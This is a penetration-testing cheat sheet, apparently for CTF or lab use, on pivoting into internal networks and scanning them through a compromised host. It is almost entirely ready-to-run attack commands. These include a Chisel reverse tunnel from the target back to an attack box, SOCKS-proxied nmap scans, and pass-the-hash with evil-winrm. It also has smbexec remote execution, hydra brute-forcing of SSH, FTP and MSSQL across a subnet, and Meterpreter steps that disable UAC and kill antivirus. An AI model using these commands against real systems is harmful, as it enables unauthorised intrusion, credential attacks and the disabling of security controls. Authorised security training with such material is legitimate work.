# Scanning though a pivot    
## Contents    
- [Scanning though a pivot](#scanning-though-a-pivot)
  * [Contents](#contents)
  * [Subnet Enumeration Commands](#subnet-enumeration-commands)
  * [ProxyChains](#proxychains)
    + [SSH Dynamic Tunnels](#ssh-dynamic-tunnels)
    + [Chisel](#chisel)
    + [Nmap scan through a dynamic SOCKS proxy](#nmap-scan-through-a-dynamic-socks-proxy)
    + [Web access:](#web-access-)
    + [Use WinRM through proxychains](#use-winrm-through-proxychains)
    + [RDP through ProxyChains](#rdp-through-proxychains)
  * [Uploading Static Binaries](#uploading-static-binaries)
  
## Subnet Enumeration Commands    
Build an IP list then scan using nmap over proxychains    
Linux  
 
    ip a   
    arp -a
    cat /etc/hosts
    cat /etc/resolv.conf  
    netstat -antp    
    for x in {1..254};do (ping -c 1 10.1.1.$x | grep "bytes from" &); done | cut -d " "    
Windows     

    ipconfig   
## ProxyChains    
Use tools like ProxyChains to scan new hosts without dropping tools to disk.     
/etc/proxychains.conf #config file. Specify SOCKS4/5 proxy    
Edit the below values in proxychains.conf or proxychains4.conf to get faster scan results (adjust based on quality of the connection and the baseline TCP response time):     

   tcp_read_time_out 1200       
   tcp_connect_time_out 800  
### SSH Dynamic Tunnels     
Set up an SSH dynamic tunnel through a bastion host to scan an internal subnet using creds:      

    ssh -D 9050 user@bastion -N -f      
### Chisel   
Set up a reverse tunnel using [Chisel](https://github.com/jpillora/chisel):    
(For CTFs you will most likely need the AMD64/x86_64 binary)       

    ./chisel server -p 8001 --reverse        #start Chisel server on attack box   
    ./chisel client 10.10.10.10:8001 R:1080:socks    #connect from to it from a client target server  
    # add 'socks5 127.0.0.1 1080 ' to /etc/proxychains.conf  
### Nmap scan through a dynamic SOCKS proxy  
Only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel proxy might be a better option:        

    proxychains nmap 10.10.10.10 -sT -p 80, 443     
    proxychains nmap -iL ips.txt -sT -sV   
### Web access:    

    Use FoxyProxy Firefox extension and add a SOCKS5 proxy 127.0.0.1:9050 to access a site through a dynamic tunnel   
[Using Burp Through a SOCKS5 Proxy](https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e)    

    Use Burp Upstream Proxies feature to add SOCKS5 proxy - set FoxyProxy Firefox addon to Burp proxy     
    Burp -> Settings (upper right corner) -> Network -> Connections -> SOCKS Proxy             
    Select the option 'Override options for this project only'. Options: 127.0.0.1, 1080, use SOCKS proxy     

### Use WinRM through proxychains         

    proxychains crackmapexec winrm 10.10.10.10 -u "USERNAME" -p "PASSWORD" -x "command"    
    proxychains evil-winrm -u Administrator -H 'hash' -i 10.10.10.10    #pass the hash         
### MSSQL Access Through Proxychains       
 
    proxychains sqsh -S 172.16.1.5 -U user -P password    
### RDP through ProxyChains       

    proxychains xfreerdp /u:DOMAIN\\username /p:password /v:ip      
### SMBExec Through Proxychains      
Using Impacket SMBexec.py script - often caught by AV so be careful        

    proxychains4 -q smbexec.py test/admin:test@192.168.1.10         
    
### Brute Force a Service Through Proxychains    

    proxychains hydra 10.10.10.10 ssh -s 22 -L users.txt -P passwords.txt -t 4     
    proxychains hydra -L usernames -P passwords 10.10.10.0/24 ftp       #brute force a subnet   
    proxychains hydra -L users –P passwords <IP> mssql   #MSSQL    
    
## Uploading Static Binaries    
Use static binaries from [here](https://github.com/ernw/static-toolbox) or [here](https://github.com/andrew-d/static-binaries)     
Upload nmap binary to a Windows target (through meterpreter and scan)      

    meter > upload nmap_binary      
    meter > shell     
    #then disable UAC  
    C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f     
    meter > killall av       #turn off AV
    meter > shutdown /r    
    #wait a few minutes then renew the Meterpreter session    
    meter > nmap-setup.exe /S   #install nmap silently   
Upload nmap binary to a Linux target (through meterpreter and scan)      

    meter > upload nmap . 
    chmod +x run-nmap.sh   
    ./run-nmap.sh   
    
